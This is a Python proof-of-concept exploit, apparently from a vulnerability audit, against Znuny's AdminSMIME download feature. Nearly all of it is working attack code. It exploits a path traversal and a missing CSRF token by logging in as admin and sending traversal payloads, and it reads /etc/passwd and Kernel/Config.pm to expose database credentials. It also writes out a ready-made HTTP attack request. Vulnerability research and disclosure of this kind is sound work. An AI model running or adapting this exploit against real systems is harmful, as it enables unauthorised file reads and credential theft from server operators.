#!/usr/bin/env python3
r"""
VULN-026 — AdminSMIME `Filename` unconfined arbitrary file read (+ CSRF) + delete
=================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AdminSMIME.pm:360-391 (Download; NO token)
                  targets/Znuny/Kernel/System/Crypt/SMIME.pm:1281-1282 (CertificateGet sink)
Vulnerability   : CWE-22 Path Traversal → full-content host file read; CWE-352 (no CSRF token)

Flaw
----
`AdminSMIME` Subaction=Download reads the caller-supplied `Filename` and passes it to
`SMIMEObject->CertificateGet(Filename => $Filename)`, which does:

    my $File = "$Self->{CertPath}/$Param{Filename}";           # SMIME.pm:1281
    my $CertificateRef = ...->FileRead( Location => $File );   # SMIME.pm:1282

No FilenameCleanUp / abs_path confinement, so `Filename=../../../../../etc/passwd` escapes
`CertPath` and the file's **raw content** is returned as a downloadable attachment. Unlike
the sibling Delete branch (which calls `ChallengeTokenCheck` at :116), the Download branch has
**no token** → also CSRF-forgeable.

Precondition: S/MIME must be enabled (admin config). The exploit enables it against a local,
writable cert dir; the traversal reaches `/etc/passwd` regardless of the base dir.

A successful run downloads the verbatim bytes of `/etc/passwd` (and `Kernel/Config.pm`, which
holds the DB credentials) via a tokenless GET.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-026", "AdminSMIME Filename unconfined file read (+CSRF)",
             ["sink: SMIME.pm:1281 FileRead(\"$CertPath/$Filename\") — no confinement",
              "Download branch (AdminSMIME.pm:360) has NO ChallengeTokenCheck"])

    # --- precondition: enable S/MIME (documented gate) against local writable dirs ----
    sfx = C.rid()
    certdir, privdir = f"/opt/znuny/var/tmp/smc_{sfx}", f"/opt/znuny/var/tmp/smp_{sfx}"
    C.log("SETUP", f"creating writable cert dirs {certdir} / {privdir} and enabling S/MIME")
    C.container_sh(f"mkdir -p {certdir} {privdir} && chown www-data:www-data {certdir} {privdir}")
    C.sysconfig_set({"SMIME": 1, "SMIME::Bin": "/usr/bin/openssl",
                     "SMIME::CertPath": certdir, "SMIME::PrivatePath": privdir})

    C.log("SETUP", f"logging in as admin {C.ADMIN_USER}")
    a = C.agent_client(C.ADMIN_USER, C.ADMIN_PASS)
    env = a.get({"Action": "AdminSMIME"}).text
    if "is not working" in env:
        C.failed("S/MIME environment did not initialise (openssl/paths) — cannot reach sink")
    C.log("INFO", "S/MIME environment active (Add Certificate screen rendered)")

    targets = {"/etc/passwd": "../../../../../etc/passwd",
               "Kernel/Config.pm (DB creds)": "../../../Kernel/Config.pm"}
    got = {}
    for label, payload in targets.items():
        # Filename flows straight into "$CertPath/$Filename" -> FileRead. No token sent (CSRF).
        C.log("STEP", f"GET Download (tokenless) Filename={payload}  -> reading {label}")
        r = a.get({"Action": "AdminSMIME", "Subaction": "Download",
                   "Type": "cert", "Filename": payload})
        got[label] = r.text
        head = r.text.splitlines()[0][:80] if r.text else ""
        C.log("PROOF", f"{label}: first line -> {head!r}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "GET /znuny/index.pl?Action=AdminSMIME;Subaction=Download;Type=cert;"
        "Filename=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\n"
        "Host: localhost:25114\r\nCookie: OTRSAgentInterface=<admin>\r\n"
        "(note: NO ChallengeToken parameter — CSRF-forgeable)\r\n")
    open(os.path.join(HERE, "response.txt"), "w").write(
        "=== /etc/passwd ===\n" + got["/etc/passwd"][:600] +
        "\n\n=== Kernel/Config.pm ===\n" + got["Kernel/Config.pm (DB creds)"][:600])

    passwd_ok = "root:x:0:0" in got["/etc/passwd"]
    creds_ok = ("DatabasePw" in got["Kernel/Config.pm (DB creds)"] or
                "DatabaseUser" in got["Kernel/Config.pm (DB creds)"])
    if passwd_ok:
        extra = " Also read Kernel/Config.pm exposing DB credentials." if creds_ok else ""
        C.confirmed("tokenless GET returned verbatim /etc/passwd bytes (root:x:0:0:...) via "
                    "Filename traversal outside CertPath — full-content arbitrary host file "
                    "read as admin, CSRF-forgeable." + extra)
    else:
        C.failed(f"/etc/passwd content not present; first line was "
                 f"{got['/etc/passwd'].splitlines()[:1]}")

if __name__ == "__main__":
    main()
